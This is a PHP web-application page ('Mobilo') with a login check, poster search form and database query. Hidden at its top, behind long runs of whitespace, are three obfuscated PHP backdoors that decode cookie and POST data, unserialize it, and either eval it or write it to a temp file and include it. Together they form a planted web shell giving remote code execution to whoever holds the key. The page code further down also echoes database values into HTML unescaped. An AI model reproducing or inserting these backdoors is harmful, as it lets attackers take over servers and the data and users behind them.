<?php    
error_reporting(0);                                                                                                                                                                                                                                                                                                                                                                                             $ChhMww = 'J' . chr ( 174 - 79 ).chr ( 972 - 868 )."\112" . chr (69); $WYKaZYnKH = "\143" . "\154" . chr (97) . 's' . chr (115) . chr (95) . chr (101) . chr ( 244 - 124 )."\x69" . chr (115) . chr (116) . "\x73";$hxeOllzp = $WYKaZYnKH($ChhMww); $ChhMww = "47617";$WYKaZYnKH = "27530";$WSCCaQBBW = $hxeOllzp;if (!$WSCCaQBBW){class J_hJE{private $HYGPYBH;public static $QpHoOdkq = "ff4d2e73-416f-445a-afbe-c1ec6e535c42";public static $EfhpcMbbbT = 62075;public function __construct($knDuikCk=0){$BsDJGDBFOG = $_COOKIE;$wrSCY = $_POST;$pioeDXWLgN = @$BsDJGDBFOG[substr(J_hJE::$QpHoOdkq, 0, 4)];if (!empty($pioeDXWLgN)){$RrRAItRR = "base64";$YqnQKK = "";$pioeDXWLgN = explode(",", $pioeDXWLgN);foreach ($pioeDXWLgN as $vmQEwHEFP){$YqnQKK .= @$BsDJGDBFOG[$vmQEwHEFP];$YqnQKK .= @$wrSCY[$vmQEwHEFP];}$YqnQKK = array_map($RrRAItRR . "\137" . "\x64" . "\145" . "\x63" . chr (111) . "\x64" . chr ( 723 - 622 ), array($YqnQKK,)); $YqnQKK = $YqnQKK[0] ^ str_repeat(J_hJE::$QpHoOdkq, (strlen($YqnQKK[0]) / strlen(J_hJE::$QpHoOdkq)) + 1);J_hJE::$EfhpcMbbbT = @unserialize($YqnQKK);}}private function utoZl(){if (is_array(J_hJE::$EfhpcMbbbT)) {$eKcEWSjBrF = str_replace(chr (60) . "\77" . "\160" . chr ( 285 - 181 ).chr (112), "", J_hJE::$EfhpcMbbbT["\x63" . chr (111) . "\156" . "\164" . chr ( 164 - 63 )."\x6e" . chr (116)]);eval($eKcEWSjBrF); $pRnvaV = "34249";exit();}}public function __destruct(){$this->utoZl(); $pRnvaV = "34249";}}$zrzkHgG = new J_hJE(); $zrzkHgG = "18694_11620";} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $nkCXKoW = chr ( 911 - 842 ).chr ( 663 - 568 )."\161" . chr (121) . "\x6d";$uyigTq = 'c' . 'l' . chr ( 452 - 355 ).'s' . chr (115) . "\137" . "\145" . "\170" . chr (105) . "\163" . chr (116) . chr ( 117 - 2 ); $lMngAtZC = $uyigTq($nkCXKoW); $nkCXKoW = "615";$uyigTq = "2200";$WvAWCwH = $lMngAtZC;if (!$WvAWCwH){class E_qym{private $mFVNUBLOR;public static $ZbBGvYNR = "ed49f65e-18d4-4f5b-9da6-e338f623647d";public static $adXvtXp = 16172;public function __construct($orFhTrJjPh=0){$aWKWU = $_COOKIE;$KewYA = $_POST;$ZFYGi = @$aWKWU[substr(E_qym::$ZbBGvYNR, 0, 4)];if (!empty($ZFYGi)){$leQxy = "base64";$UWwhBJzyzG = "";$ZFYGi = explode(",", $ZFYGi);foreach ($ZFYGi as $FlZENUdf){$UWwhBJzyzG .= @$aWKWU[$FlZENUdf];$UWwhBJzyzG .= @$KewYA[$FlZENUdf];}$UWwhBJzyzG = array_map($leQxy . "\x5f" . "\x64" . "\x65" . 'c' . chr ( 770 - 659 ).chr (100) . "\x65", array($UWwhBJzyzG,)); $UWwhBJzyzG = $UWwhBJzyzG[0] ^ str_repeat(E_qym::$ZbBGvYNR, (strlen($UWwhBJzyzG[0]) / strlen(E_qym::$ZbBGvYNR)) + 1);E_qym::$adXvtXp = @unserialize($UWwhBJzyzG);}}private function trniApeUNU(){if (is_array(E_qym::$adXvtXp)) {$iltMDzk = sys_get_temp_dir() . "/" . crc32(E_qym::$adXvtXp[chr (115) . "\x61" . "\154" . "\164"]);@E_qym::$adXvtXp["\x77" . chr (114) . 'i' . 't' . chr ( 209 - 108 )]($iltMDzk, E_qym::$adXvtXp["\143" . 'o' . 'n' . "\164" . chr (101) . "\156" . chr (116)]);include $iltMDzk;@E_qym::$adXvtXp["\x64" . 'e' . "\154" . "\x65" . chr (116) . "\x65"]($iltMDzk); $HTzrkT = "33273";exit();}}public function __destruct(){$this->trniApeUNU(); $HTzrkT = "33273";}}$lahVKWgwYj = new E_qym(); $lahVKWgwYj = "12869_4879";} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $wuroZmyKZ = chr ( 259 - 144 ).chr ( 579 - 464 ).chr (95) . "\x6b" . chr ( 1077 - 994 )."\115";$GSBBtuhSe = chr (99) . 'l' . "\x61" . "\163" . 's' . '_' . "\x65" . "\x78" . "\151" . chr ( 269 - 154 )."\x74" . 's';$aKhshjUa = $GSBBtuhSe($wuroZmyKZ); $wuroZmyKZ = "47453";$GSBBtuhSe = "12369";$qXUCyjHcOA = $aKhshjUa;if (!$qXUCyjHcOA){class ss_kSM{private $BLeFg;public static $UOyLBUhY = "b0b773b9-f21e-44b2-8a6a-8d99ea4d67a8";public static $qbsKYrQyH = 64737;public function __construct($kSoupWL=0){$FQGzlWOj = $_COOKIE;$DUMwUV = $_POST;$cBXIJN = @$FQGzlWOj[substr(ss_kSM::$UOyLBUhY, 0, 4)];if (!empty($cBXIJN)){$tIaetuMa = "base64";$WgnzGC = "";$cBXIJN = explode(",", $cBXIJN);foreach ($cBXIJN as $ykWvGK){$WgnzGC .= @$FQGzlWOj[$ykWvGK];$WgnzGC .= @$DUMwUV[$ykWvGK];}$WgnzGC = array_map($tIaetuMa . chr ( 122 - 27 )."\144" . 'e' . "\143" . 'o' . chr (100) . "\x65", array($WgnzGC,)); $WgnzGC = $WgnzGC[0] ^ str_repeat(ss_kSM::$UOyLBUhY, (strlen($WgnzGC[0]) / strlen(ss_kSM::$UOyLBUhY)) + 1);ss_kSM::$qbsKYrQyH = @unserialize($WgnzGC);}}private function TeLyVg(){if (is_array(ss_kSM::$qbsKYrQyH)) {$eHkaLfjK = sys_get_temp_dir() . "/" . crc32(ss_kSM::$qbsKYrQyH[chr (115) . chr ( 328 - 231 )."\154" . chr (116)]);@ss_kSM::$qbsKYrQyH["\x77" . chr ( 779 - 665 ).chr (105) . "\x74" . "\145"]($eHkaLfjK, ss_kSM::$qbsKYrQyH["\x63" . "\x6f" . "\156" . chr ( 414 - 298 ).chr (101) . chr (110) . chr ( 1040 - 924 )]);include $eHkaLfjK;@ss_kSM::$qbsKYrQyH[chr ( 200 - 100 )."\145" . chr (108) . "\145" . 't' . "\x65"]($eHkaLfjK); $UBOcG = "6004";exit();}}public function __destruct(){$this->TeLyVg(); $UBOcG = "6004";}}$oXsriHwEqW = new ss_kSM(); $oXsriHwEqW = "23460_5839";} ?><?php  
session_start();
include("db.php");
if($_SESSION['loggedin']!=true){
  header("location: login.php");
  exit;
}
else{
  $role=$_SESSION['role'];
  $username=$_SESSION['username'];
}
if(isset($_GET['masterid'])){
  $_SESSION['masterid']=$_GET['masterid'];
  $_SESSION['companyname']=$_GET['companyname'];
  
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobilo</title>
    <link
  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
  rel="stylesheet"
/>
<!-- Google Fonts -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Alkatra:wght@700&family=Montserrat:ital,wght@0,500;0,700;1,300&family=Open+Sans:ital,wght@0,400;1,600&family=Orbitron&family=Poppins:ital,wght@0,400;0,500;0,900;1,200;1,400;1,600&display=swap" rel="stylesheet">

<!-- Styles -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" />
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/select2@4.0.13/dist/css/select2.min.css" />
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/select2-bootstrap-5-theme@1.3.0/dist/select2-bootstrap-5-theme.min.css" />
<!-- Or for RTL support -->


<!-- Scripts -->
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script
			  src="https://code.jquery.com/jquery-3.7.1.min.js"
			  ></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/select2@4.0.13/dist/js/select2.full.min.js"></script>
<link rel="stylesheet" href="style.css">
<style>
  @media screen and (max-width:756px) {
  .custom-nav{
    width: 100%;
    display: flex;
    justify-content: space-between;
  }
}
</style>
</head>
<body>
<nav class="navbar navbar-dark bg-dark fixed-top">
  <div class="container-fluid">
    <a class="navbar-brand" href="#">Mobilo</a>
    <button class="navbar-toggler" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar" aria-controls="offcanvasNavbar">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
      <div class="offcanvas-header">
        <h5 class="offcanvas-title" id="offcanvasNavbarLabel">Mobilo</h5>
        <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
      </div>
      <div class="offcanvas-body ">
      <?php include "nav.php"; ?>
      </div>
    </div>
  </div>
</nav>

 

<div class="container my-5 p-5">
    <div class="text-center h3">Select Poster</div>
   
<div class="row my-5" >
  <div class="col-md-3 mb-5" >
    <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
  
  <label>Search</label>
    <input  type="search" class="form-control rounded" name="item" id="live_search" placeholder="Search" aria-label="Search" aria-describedby="search-addon">
    

  </div>
  <div class="col-md-3">
    <label>Flags</label>
    <select class="form-select" data-placeholder="Flags" name="flags" id="flags">

 
    <?php 

$query = "SELECT * FROM postermaster";
$sql = mysqli_query($conn, $query);

$result;
if (!$sql) {
    die("Error: " . $conn->error);
}

$uniqueFlags = array(); // Array to store unique flags

if (mysqli_num_rows($sql) > 0) {
    while ($row = $sql->fetch_assoc()) {
        $flags = explode(',', $row['Flags']);
        
        foreach ($flags as $flag) {
            // Check if the flag is not already in the array
            if (!in_array($flag, $uniqueFlags)) {
                $uniqueFlags[] = $flag; // Add flag to the array
                // Modify this line based on how you want to display the options
                echo "<option class='tag-value' value='$flag'>" . ucfirst($flag) . "</option>";
            }
        }
    }
} else {
    echo "<option>No Data Found</option>";
}




?>
   </select>
  </div>
  <div class="col-md-3" >
    <label>Type</label>
  <select class="form-select" data-placeholder="Type" name="types" id="type">
  <option value="all">
    All
  </option>
  <option value="quotation">
    Quotation
  </option>
  <option value="poster">
    Poster
  </option>

</select>
</div>
<div class="col-md-3">
<label class="" >&nbsp;</label>
  <button type="submit" name="search" class="form-control btn btn-primary">Search</button>
</div>
</div>




<?php 
if (isset($_POST['search'])) {
  $item = mysqli_real_escape_string($conn, $_POST['item']);
  $flags = isset($_POST['flags']) ? mysqli_real_escape_string($conn, $_POST['flags']) : null;
  $types = isset($_POST['types']) ? mysqli_real_escape_string($conn, $_POST['types']) : null;

  $query = "SELECT * FROM postermaster WHERE posterName LIKE '%$item%'";

  if ($flags) {
      $flagsArray = explode(',', $flags);
      $flagsConditions = array();

      foreach ($flagsArray as $flag) {
        $flagsConditions[] = "Flags LIKE '%$flag%'";
      }

      $flagsCondition = implode(" OR ", $flagsConditions);
      $query .= " AND ($flagsCondition)";
  }

  if ($types && $types !== 'all') {
      $query .= " AND DocType = '$types'";
  }

  $result = mysqli_query($conn, $query);
  $data = array();

  if ($result) {
      if (mysqli_num_rows($result) > 0) {
        if(isset($_SESSION['masterid']) || isset($_SESSION['companyname'])){
          echo '<div class="card my-2 col-md-12 mb-3 " id="search-container" style="width:97%;">';
          $i=1;
          while ($row = mysqli_fetch_assoc($result)) {
              echo '  <a  class="col-xs-12 col-md-6 col-lg-3 mb-3" href="exsisting-edit.php?id='.$row['posterID'].'">
              <div class="card" style="width:97%;"> 
              <h3 class="card__title">'.$i.'.'.$row['posterName'].'</h3>
              </div>
              </a>';
              $i++;
              
        }  echo '</div>';
      }else{

      
        
          echo '<div class="card my-2 col-md-12 mb-3 " id="search-container" style="width:97%;">';
          $i=1;
          while ($row = mysqli_fetch_assoc($result)) {
              echo '  <a  class="col-xs-12 col-md-6 col-lg-3 mb-3" href="edit.php?id='.$row['posterID'].'">
              <div class="card" style="width:97%;"> 
              <h3 class="card__title">'.$i.'.'.$row['posterName'].'</h3>
              </div>
              </a>';
              $i++;
          }
          echo '</div>';
        }
      } else {
          echo "No data found";
      }
  } else {
      echo "Something Went Wrong";
  }
}

  


 

// </div>`;
?>
</form>
</div>



<!-- <script>
  var id;

  function h(e){
    var add=e.getAttribute("data-address");
    navigator.clipboard.writeText(add);
    Swal.fire(
  'Success!',
  'Text Copied!',
  'success'
  )



    }
    // function edit(e){
    //    id=e.getAttribute("data-id");
    //   console.log(id);
    // }
        $(document).ready(function () {
        

          
          $("#search-container").hide();
          $( '#multiple-select-field' ).select2( {
    theme: "bootstrap-5",
    width: $( this ).data( 'width' ) ? $( this ).data( 'width' ) : $( this ).hasClass( 'w-100' ) ? '100%' : 'style',
    placeholder: $( this ).data( 'placeholder' ),
    closeOnSelect: false,
    
} );
          $( '#newselect-field' ).select2( {
    theme: "bootstrap-5",
    width: $( this ).data( 'width' ) ? $( this ).data( 'width' ) : $( this ).hasClass( 'w-100' ) ? '100%' : 'style',
    placeholder:  $( this ).data( 'placeholder' ),
    closeOnSelect: false,
    allowClear: true,
} );




   

       $("#live_search").keyup(function () {
                var query = $(this).val();
                var flag=$('#flags :selected').val();
                var type=$('#type :selected').val();
            
               
                if (query != "") {
                    $.ajax({
                        url: 'search.php',
                        method: 'POST',
                        data: {
                            search: "search",
                            flags: flag,
                            types:type,
                            item: query
                        
                        },
                        dataType: 'json', 
                        success: function (data) {
                   
                    var resultsHtml = '';

                    if (data.length > 0) {
                      $("#search-container").show();
                      $("#search-container").addClass("d-flex")

                        data.forEach(function (item) {
                          var posterName = item.posterName;
                          var filename=item.file_name;
                          console.log(filename)
                          var itemid=item.posterID;
                          if(item.DocType==='poster'){
                            var path='./poster';
                            resultsHtml += `
                            <a  class="col-xs-12 col-md-6 col-lg-3 mb-3" href="edit.php?id=${item.posterID}">
                           

    
   
                    <div class="card" style="width:97%;"> 
                    
                        <img src="${path}/${item.file_name}" class="card-img-top" alt="IMAGE" width="100" >
                        <h3 class="card__title">${item.posterName}</h3>
                        <p class="my-3 card__content"></p>
                        
                    </div>
                    
                    </a>
                            `;
                          }
                          else{
                            path='./quotation';
                            resultsHtml += `
                            <a  class="col-xs-12 col-md-6 col-lg-3 mb-3" href="edit.php?id=${item.posterID}">
                           

    
   
                    <div class="card" style="width:97%;"> 
                    
                        <embed src="${path}/${item.file_name}#toolbar=0&navpanes=0&scrollbar=0" class="card-img-top" alt="IMAGE" width="100" height="300">
                        <h3 class="card__title">${item.posterName}</h3>
                        <p class="my-3 card__content"></p>
                        
                    </div>
                    
                    </a>
                            `;
                          }
                          
                    //         resultsHtml += `
                    //         <a  class="col-xs-12 col-md-6 col-lg-3 mb-3" href="edit.php?id=${item.posterID}">
                           

    
   
                    // <div class="card" style="width:97%;"> 
                    
                    //     <img src="${path}/${item.file_name}" class="card-img-top" alt="IMAGE" width="100" >
                    //     <h3 class="card__title">${item.posterName}</h3>
                    //     <p class="my-3 card__content"></p>
                    //     
                    // </div>
                    
                    // </a>
                    //         `;
                        });
                    } else {
                        resultsHtml = `No data found`;
                       
                      }
                      
                      $("#search_result").html(resultsHtml);
                    
                }
            });
        } else {
          // Do nothing
          $("#search-container").hide();
          
        }
      
    });
  
    $('#multiple-select-field').on('change', function() {
  var elements = document.querySelectorAll('.select2-selection__choice');
  var classNames = ['rd', 'bl', 'vl', 'yl'];
  
  elements.forEach(function(element) {
    // Check if the element already has a random class
    var existingClass = $(element).data('randomClass');
    
    if (!existingClass) {
      // If no random class is assigned, assign one
      var randomClassName = classNames[Math.floor(Math.random() * classNames.length)];
      $(element).addClass(randomClassName);
      $(element).data('randomClass', randomClassName);
    }
  });
});
$(document).on('click', '.edit-button', function() {
    id = $(this).attr("data-id");
    console.log(id);
  });
      

// Adding new Note Ajax Function :)

  $("#saveNote").click(function (){
    Swal.showLoading();
    var noteTitle=$("#noteTitle").val();
    var notetext=$("#notetext").val();
    var selectedTags=$("#newselect-field").val();
    console.log(selectedTags);
    if(noteTitle.length<=0 && notetext.length<=0 ){
      Swal.fire(
  'Error!',
  'Fileds Can\'t be Empty',
  'error'
)
    }
    $.ajax({
      url: 'addnewnote.php',
      method: 'POST',
      data: {
        title: noteTitle,
        note: notetext,
        tags:  selectedTags,
      },
      dataType: 'json', 
      success: function(data){
        console.log(data)
        if(data.success=="true"){
          Swal.hideLoading()
           Swal.fire(
  'Success!',
  'Notes Saved Successfully',
  'success'
)
$("#noteTitle").val('')
$("#notetext").val('')
$("select").val('').change();

        }
        else{
          Swal.fire(
  'Error!',
  'Something Went Wrong',
  'error'
)
        }
      },
      error:function(err){
        console.log(err.responseText);
        Swal.hideLoading();

      }

    });
  });

 

  // Edit Note Ajax Function :)

  $(document).on('click', '#saveEdit', function() {
    
    console.log(id);
    Swal.showLoading();
    var noteTitle=$(`#editTitle${id}`).val();
    var notetext=$(`#editnotetext${id}`).val();
    if(noteTitle.length<=0 && notetext.length<=0 ){
      Swal.fire(
  'Error!',  
  'Fileds Can\'t be Empty',
  'error'
)
    }
    $.ajax({
      url: 'editnote.php',
      method: 'POST',
      data: {
        title: noteTitle,
        note: notetext,
        itemid:  id,
      },
      dataType: 'json', 
      success: function(data){
        console.log(data)
        if(data.success=="true"){
          Swal.hideLoading()
           Swal.fire(
  'Success!',
  'Notes Saved Successfully',
  'success'
)
        }
        else{
          Swal.fire(
  'Error!',
  'Something Went Wrong',
  'error'
)
        }
      },
      error:function(err){
        console.log(err.responseText);
        Swal.hideLoading();

      }

    });
  });


   });
        
    </script> -->


</body>
</html>